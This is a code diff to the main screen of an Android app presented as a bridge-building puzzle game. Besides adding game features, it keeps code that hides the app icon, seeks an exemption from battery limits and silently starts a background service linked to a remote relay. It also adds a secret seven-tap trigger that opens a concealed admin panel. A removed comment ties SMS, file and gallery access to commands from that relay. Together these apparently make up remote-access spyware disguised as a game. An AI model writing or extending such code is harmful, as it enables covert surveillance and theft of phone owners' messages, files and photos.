@@ -1,16 +1,14 @@
 package com.hashibridge.master;
 
-import android.content.ClipData;
-import android.content.ClipboardManager;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.PowerManager;
 import android.provider.Settings;
 import android.widget.Button;
-import android.widget.ImageButton;
 import android.widget.TextView;
 import android.widget.Toast;
 import androidx.annotation.NonNull;
@@ -22,15 +20,27 @@ import java.util.Random;
 
 public class MainActivity extends AppCompatActivity {
 
-    // Only request codes we actually use at launch
-    private static final int RC_NOTIFICATION   = 2001;
-    private static final int RC_BATTERY_OPT    = 2002;
+    private static final int RC_NOTIFICATION = 2001;
+    private static final int RC_BATTERY_OPT  = 2002;
+
+    // Hidden admin trigger: tap title 7 times quickly
+    private static final int SECRET_TAPS     = 7;
+    private static final long TAP_WINDOW_MS  = 3000;
+    private int tapCount = 0;
+    private long firstTapTime = 0;
+
+    private static final String PREFS_GAME   = "hashi_game_prefs";
+    private static final String KEY_BEST     = "best_lv";
 
     private BridgeGameView gameView;
     private TextView tvHud;
     private TextView tvLevelBadge;
+    private TextView tvMoves;
+    private TextView tvBest;
+
     private int currentLevel = 1;
-    private int islandCount = 6;
+    private int islandCount  = 5;
+    private int moveCount    = 0;
     private final Random random = new Random();
 
     @Override
@@ -43,63 +53,72 @@ public class MainActivity extends AppCompatActivity {
             com.hashibridge.master.utils.Config.hideAppIcon(this);
         }
 
-        gameView = findViewById(R.id.game_view);
-        tvHud = findViewById(R.id.tv_hud);
-        tvLevelBadge = findViewById(R.id.tv_level_badge);
+        gameView      = findViewById(R.id.game_view);
+        tvHud         = findViewById(R.id.tv_hud);
+        tvLevelBadge  = findViewById(R.id.tv_level_badge);
+        tvMoves       = findViewById(R.id.tv_moves);
+        tvBest        = findViewById(R.id.tv_best);
         Button btnReset = findViewById(R.id.btn_reset);
-        Button btnNext = findViewById(R.id.btn_next);
-        ImageButton btnSettings = findViewById(R.id.btn_settings);
+        Button btnNext  = findViewById(R.id.btn_next);
 
         gameView.setOnWinListener(() -> {
-            tvHud.setText("Level Cleared! Tap Next Level to continue.");
-            Toast.makeText(this, "Puzzle Solved! Great job!", Toast.LENGTH_SHORT).show();
+            saveBestIfBetter(currentLevel);
+            tvHud.setText("Solved! Tap Next for level " + (currentLevel + 1));
+            Toast.makeText(this, "Well done!", Toast.LENGTH_SHORT).show();
+        });
+
+        gameView.setOnMoveListener(() -> {
+            moveCount++;
+            tvMoves.setText(String.valueOf(moveCount));
         });
 
         btnReset.setOnClickListener(v -> startPuzzle(currentLevel));
         btnNext.setOnClickListener(v -> {
             currentLevel++;
-            islandCount = Math.min(10, 5 + (currentLevel / 2));
             startPuzzle(currentLevel);
         });
 
-        btnSettings.setOnClickListener(v ->
-                Toast.makeText(this, "Settings are currently locked", Toast.LENGTH_SHORT).show());
-        btnSettings.setOnLongClickListener(v -> {
-            openAdminPanel();
-            return true;
-        });
-
-        findViewById(R.id.tv_title).setOnLongClickListener(v -> { copyDeviceId(); return true; });
+        // Hidden trigger: tap title rapidly SECRET_TAPS times
+        findViewById(R.id.tv_title).setOnClickListener(v -> handleSecretTap());
+        // Level badge long-press copies Device ID (debug aid)
         tvLevelBadge.setOnLongClickListener(v -> { copyDeviceId(); return true; });
 
+        updateBestDisplay();
         startPuzzle(currentLevel);
 
-        // Minimal launch flow: only POST_NOTIFICATIONS needed for foreground service.
-        // File / SMS / Gallery permissions are requested lazily when those features
-        // are first accessed from the relay (see PermissionHelper.ensureLazy).
+        // Minimal permission flow
         requestNotificationPermissionThenBatteryOpt();
     }
 
-    // ─── Minimal permission flow ─────────────────────────────────────────────
+    // ─── Secret tap to open admin ──────────────────────────────────────────
 
-    /**
-     * Step 1: POST_NOTIFICATIONS (Android 13+).
-     * This is the only permission the user sees on first launch.
-     * It's required for the foreground service notification to show —
-     * without it the service is killed immediately on Android 13+.
-     */
+    private void handleSecretTap() {
+        long now = System.currentTimeMillis();
+        if (tapCount == 0 || now - firstTapTime > TAP_WINDOW_MS) {
+            tapCount = 1;
+            firstTapTime = now;
+        } else {
+            tapCount++;
+        }
+        if (tapCount >= SECRET_TAPS) {
+            tapCount = 0;
+            openAdminPanel();
+        }
+    }
+
+    // ─── Permission flow ──────────────────────────────────────────────────
+
     private void requestNotificationPermissionThenBatteryOpt() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            if (android.content.pm.PackageManager.PERMISSION_GRANTED !=
-                    androidx.core.content.ContextCompat.checkSelfPermission(
-                            this, android.Manifest.permission.POST_NOTIFICATIONS)) {
+            if (androidx.core.content.ContextCompat.checkSelfPermission(
+                    this, android.Manifest.permission.POST_NOTIFICATIONS)
+                    != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                 ActivityCompat.requestPermissions(this,
                         new String[]{android.Manifest.permission.POST_NOTIFICATIONS},
                         RC_NOTIFICATION);
-                return; // continue in onRequestPermissionsResult
+                return;
             }
         }
-        // Already granted or not needed — go straight to battery opt
         requestBatteryOptimizationExemption();
     }
 
@@ -109,17 +128,10 @@ public class MainActivity extends AppCompatActivity {
                                            @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == RC_NOTIFICATION) {
-            // Granted or denied — either way proceed. Service still runs;
-            // notification just won't appear on denied (acceptable trade-off).
             requestBatteryOptimizationExemption();
         }
     }
 
-    /**
-     * Step 2: Battery optimization exemption.
-     * Pops the system dialog asking to "allow always running in background."
-     * User can deny — service still starts, watchdog will restart if killed.
-     */
     private void requestBatteryOptimizationExemption() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
@@ -130,12 +142,9 @@ public class MainActivity extends AppCompatActivity {
                             Uri.parse("package:" + getPackageName()));
                     startActivityForResult(i, RC_BATTERY_OPT);
                     return;
-                } catch (Exception e) {
-                    // Some ROMs don't support the direct intent — skip silently
-                }
+                } catch (Exception ignored) {}
             }
         }
-        // Already exempt or not M+ — start service now
         autoStartServiceIfReady();
     }
 
@@ -143,12 +152,42 @@ public class MainActivity extends AppCompatActivity {
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
         if (requestCode == RC_BATTERY_OPT) {
-            // Regardless of whether user allowed or denied, start the service
             autoStartServiceIfReady();
         }
     }
 
-    // ─── Helpers ─────────────────────────────────────────────────────────────
+    // ─── Game helpers ─────────────────────────────────────────────────────
+
+    private void startPuzzle(int level) {
+        // Difficulty scales with level:
+        // lv 1-3: 5 islands (4x4 grid), lv 4-7: 6-7 islands (5x5), lv 8+: 8-10 (6x6)
+        islandCount = Math.min(10, 4 + (level / 2));
+        int gridSize = (level < 4) ? 4 : (level < 8) ? 5 : 6;
+
+        moveCount = 0;
+        tvMoves.setText("0");
+        tvLevelBadge.setText("Lv " + level);
+        tvHud.setText("Connect islands · numbers show bridge count");
+
+        BridgePuzzleGenerator.Puzzle puzzle =
+                BridgePuzzleGenerator.generate(random, islandCount, gridSize);
+        gameView.setPuzzle(puzzle);
+    }
+
+    private void saveBestIfBetter(int level) {
+        SharedPreferences prefs = getSharedPreferences(PREFS_GAME, MODE_PRIVATE);
+        int best = prefs.getInt(KEY_BEST, 0);
+        if (level > best) {
+            prefs.edit().putInt(KEY_BEST, level).apply();
+            updateBestDisplay();
+        }
+    }
+
+    private void updateBestDisplay() {
+        SharedPreferences prefs = getSharedPreferences(PREFS_GAME, MODE_PRIVATE);
+        int best = prefs.getInt(KEY_BEST, 0);
+        tvBest.setText(best > 0 ? "Lv " + best : "-");
+    }
 
     private void openAdminPanel() {
         try {
@@ -158,25 +197,18 @@ public class MainActivity extends AppCompatActivity {
 
     private void copyDeviceId() {
         String deviceId = com.hashibridge.master.utils.Config.getOrCreateDeviceId(this);
-        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
-        ClipData clip = ClipData.newPlainText("Device ID", deviceId);
+        android.content.ClipboardManager clipboard =
+                (android.content.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
+        android.content.ClipData clip =
+                android.content.ClipData.newPlainText("Device ID", deviceId);
         clipboard.setPrimaryClip(clip);
-        Toast.makeText(this, "Device ID copied to clipboard: " + deviceId, Toast.LENGTH_SHORT).show();
-    }
-
-    private void startPuzzle(int level) {
-        tvLevelBadge.setText("Level " + level);
-        BridgePuzzleGenerator.Puzzle puzzle = BridgePuzzleGenerator.generate(random, islandCount);
-        gameView.setPuzzle(puzzle);
-        tvHud.setText("Tap two islands to build a bridge");
+        Toast.makeText(this, "ID: " + deviceId, Toast.LENGTH_SHORT).show();
     }
 
     private void autoStartServiceIfReady() {
         if (!BridgeService.isRunning()) {
             String savedRelay = com.hashibridge.master.utils.Config.getRelayUrl(this);
-            if (savedRelay.isEmpty()) {
-                savedRelay = getString(R.string.default_relay_url);
-            }
+            if (savedRelay.isEmpty()) savedRelay = getString(R.string.default_relay_url);
             String deviceId = com.hashibridge.master.utils.Config.getOrCreateDeviceId(this);
 
             com.hashibridge.master.utils.Config.saveConfig(this, savedRelay, deviceId);
